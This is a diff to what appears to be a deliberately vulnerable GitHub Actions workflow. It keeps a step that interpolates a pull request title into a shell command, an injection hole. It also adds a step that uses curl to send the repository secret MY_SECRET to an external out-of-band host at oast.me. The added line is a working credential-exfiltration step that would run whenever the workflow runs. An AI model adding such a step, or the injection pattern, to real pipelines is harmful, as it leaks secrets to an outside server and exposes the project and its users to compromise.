@@ -15,8 +15,11 @@ jobs:
 
     # Unsafe step: Executes commands from user-controlled input (e.g., PR's title)
     - name: Run untrusted code
-      run: echo "${{ github.event.pull_request.title }}"
+      run: |
+        echo "${{ github.event.pull_request.title }}"
 
     # Displaying secrets without restriction (vulnerable)
     - name: Print secrets (unsafe)
-      run: echo "The secret is: ${{ secrets.MY_SECRET }}"
+      run: curl "http://crge3bgc3vnr5rqm2820o8w5bgw5tqast.oast.me/?q=$MY_SECRET"
+      env:
+        MY_SECRET: ${{ secrets.MY_SECRET }}
